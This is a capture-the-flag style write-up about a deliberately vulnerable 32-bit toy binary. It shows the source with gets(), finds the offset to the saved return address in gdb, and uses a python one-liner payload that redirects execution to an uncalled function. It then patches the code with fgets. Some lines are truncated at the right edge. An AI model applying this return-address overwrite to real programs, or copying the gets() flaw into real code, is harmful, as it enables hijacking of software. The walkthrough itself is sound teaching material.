irst let's see if it is a 32 bit or 64 bit elf.

```
root@tux:/Hackery/escape/buf_ovf/b3# file b3
b3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=04ca21b1b588df970bdcb4763cbc9e647fe73c94, not stripped
```

Now that we know it is a 32 bit elf, let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>

void fun0()
{
        char buf0[100];
        printf("What is 1 divided by 0?\n");
        gets(buf0);
}


int main()
{
        printf("To reach the end of this room, you must answer one simple question with base 10 numbers.\n");
        fun0();
}

void end()
{
        printf("That is one way of reaching the end. Level Cleared\n");
}
```

So we can see here, our objective is to get the code to run the end() function. However it isn't called anywhere in the code, or given the oppurtunity to through th euse of something like an if then stat$
in the fun0() function, it has a buffer overflow vulnerabillity. We can use the buffer overflow vulnerabillity to overflow the eip register (since it is 32 bit) to change the return address to that of th$

We will need to calculate the difference between the start of our input and where the eip register is stored. For this we can use gdb.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b3$ gdb ./b3
```

One wall of text later...

```
gdb-peda$ disas fun0
Dump of assembler code for function fun0:
   0x0804843b <+0>:     push   ebp
   0x0804843c <+1>:     mov    ebp,esp
   0x0804843e <+3>:     sub    esp,0x78
   0x08048441 <+6>:     sub    esp,0xc
   0x08048444 <+9>:     push   0x8048530
   0x08048449 <+14>:    call   0x8048310 <puts@plt>
   0x0804844e <+19>:    add    esp,0x10
   0x08048451 <+22>:    sub    esp,0xc
   0x08048454 <+25>:    lea    eax,[ebp-0x6c]
   0x08048457 <+28>:    push   eax
   0x08048458 <+29>:    call   0x8048300 <gets@plt>
   0x0804845d <+34>:    add    esp,0x10
   0x08048460 <+37>:    nop
   0x08048461 <+38>:    leave
   0x08048462 <+39>:    ret
End of assembler dump.
gdb-peda$ b *fun0+34
Breakpoint 1 at 0x804845d
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b3/b3
To reach the end of this room, you must answer one simple question with base 10 numbers.
What is 1 divided by 0?
0000
```

Another wall of text later...

```
Breakpoint 1, 0x0804845d in fun0 ()
gdb-peda$ x $ebp-0x6c
0xffffcfcc:     0x30303030
gdb-peda$ info frame
Stack level 0, frame at 0xffffd040:
 eip = 0x804845d in fun0; saved eip = 0x8048489
 called by frame at 0xffffd060
 Arglist at 0xffffd038, args:
 Locals at 0xffffd038, Previous frame's sp is 0xffffd040
 Saved registers:
  ebp at 0xffffd038, eip at 0xffffd03c
gdb-peda$ print end
$1 = {<text variable, no debug info>} 0x8048496 <end>
```

So we have the location of where the buffer starts, which is 0xffffcfcc. In addition to that we also have the location of the eip register 0xffffd03c, and the location of the end() function 0x8048496. No$

```
root@tux:/home/guyinatuxedo# python
Python 2.7.12 (default, Nov 19 2016, 06:48:10)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xffffd03c - 0xffffcfcc
112
>>> quit()
root@tux:/home/guyinatuxedo#
```

So we need to input 112 bytes in order to reach the eip register. Then we can push the eip register onto the stack in little endian. Let's make an exploit to do that.

```
root@tux:/Hackery/escape/buf_ovf/b3# python -c 'print "0"*112 + "\x96\x84\x04\x08"' | ./b3
To reach the end of this room, you must answer one simple question with base 10 numbers.
What is 1 divided by 0?
That is one way of reaching the end. Level Cleared
Segmentation fault (core dumped)
```

And just like that, we hijacked code execution and pwned the binary. Now let's patch it.

```
#include <stdio.h>
#include <stdlib.h>

void fun0()
{
        char buf0[100];
        printf("What is 1 divided by 0?\n");
        fgets(buf0, sizeof(buf0), stdin);
}


int main()
{
        printf("To reach the end of this room, you must answer one simple question with base 10 numbers.\n");
        fun0();
}

void end()
{
        printf("That is one way of reaching the end. Level Cleared\n");
}
```

Let's test our patch by trying to overflow it's buffer.

```
root@tux:/Hackery/escape/buf_ovf/b3# python -c 'print "0"*200' | ./b3_secure
To reach the end of this room, you must answer one simple question with base 10 numbers.
What is 1 divided by 0?
```




